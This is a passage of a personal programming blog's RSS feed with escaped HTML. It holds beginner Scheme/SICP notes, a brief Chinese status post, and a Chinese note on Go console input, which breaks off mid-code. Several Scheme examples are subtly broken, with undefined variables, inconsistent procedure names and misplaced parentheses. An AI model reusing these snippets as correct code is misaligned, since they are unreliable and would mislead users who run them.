&lt;/div>&lt;h3 id="combination-of-primitive-elements">combination of primitive elements&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; combination of operands and operator-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="mf">17.4&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; a more complex combination&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="mi">5&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; define a value&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">A&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="mi">5&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1">; def A=5*5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">A&lt;/span> &lt;span class="nv">A&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">; 5*5*5*5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">B&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">A&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nv">*&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="nv">A&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">A&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="nv">B&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1">; 65&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="primitive-procedures">primitive procedures&lt;/h3>
&lt;blockquote>
&lt;p>Attention
define without &amp;lsquo;()&amp;rsquo; output a value
otherwide a proceduce&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; define a procedure&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">; 100&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; the same as below&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; key word `lambda` define a procedure, which is sy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">square&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">* &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">mean-square&lt;/span> &lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="branch-statement">branch statement&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;conditional statement &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abs &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">cond &lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="nb">= &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="nb">&amp;gt; &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; if-else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abs &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="example">example&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; a method to compute sqrt of x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nv">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">good_enough?&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abs &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">improve&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">try&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">good-enough?&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">guess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">try&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">improve&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>a more compact method to implement it&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">sqrt &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">good_enough?&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abs &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abs &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="mf">0.01&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">improve&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="nv">m&lt;/span> &lt;span class="nv">n&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">m&lt;/span> &lt;span class="nv">n&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nf">try&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">good_enough?&lt;/span> &lt;span class="nv">guess&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">guess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">try&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">improve&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">try&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Come_back</title><link>https://resyon.netlify.app/p/come_back/</link><pubDate>Sun, 30 Apr 2023 09:03:27 +0800</pubDate><guid>https://resyon.netlify.app/p/come_back/</guid><description>&lt;h1 id="阶段性总结">阶段性总结&lt;/h1>
&lt;h2 id="overview">overview&lt;/h2>
&lt;p>消失了一段时间，这一阶段要忙的事情，终于接近尘埃落定，写下这篇这些文字，也算是对过去的自己的一个交代。&lt;/p>
&lt;p>基本是流水帐的形式，记录了这段时间的时期&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//TODO:后面再更吧
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>ACM 模式输入输出</title><link>https://resyon.netlify.app/p/acm-%E6%A8%A1%E5%BC%8F%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</link><pubDate>Sun, 20 Mar 2022 17:19:42 +0800</pubDate><guid>https://resyon.netlify.app/p/acm-%E6%A8%A1%E5%BC%8F%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</guid><description>&lt;h1 id="acm-模式输入输出">ACM 模式输入输出&lt;/h1>
&lt;blockquote>
&lt;p>近期参加了几场笔试，对 ACM 模式的算法输入输出倍感恶心， 总结一下&lt;/p>
&lt;/blockquote>
&lt;h2 id="api">API&lt;/h2>
&lt;ol>
&lt;li>fmt.Scanf: 和 C 一样&lt;/li>
&lt;li>fmt.Scan: 同上&lt;/li>
&lt;li>fmt.Scanln: 和名字不一样，&lt;strong>他遇到空格会停下&lt;/strong>&lt;/li>
&lt;li>strings.Fields(string) -&amp;gt; []string: 将字符串按空格分开&lt;/li>
&lt;li>bufio.Reader.ReadBytes(byte) -&amp;gt; ([]byte, error): 读取目标字符前的所有字符&lt;/li>
&lt;/ol>
&lt;h2 id="输入">输入&lt;/h2>
&lt;p>输入样例
2 对坐标，n 行整型&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">8 9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">7 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0 32 4 3 5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">43 4 2 4 3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">x&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">y&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">m&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">vs&lt;/span> &lt;span class="p">[][]&lt;/span>&lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 1. c-like
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%d %d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 2.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 3. read line
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">reader&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bufio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">io&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stdin&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
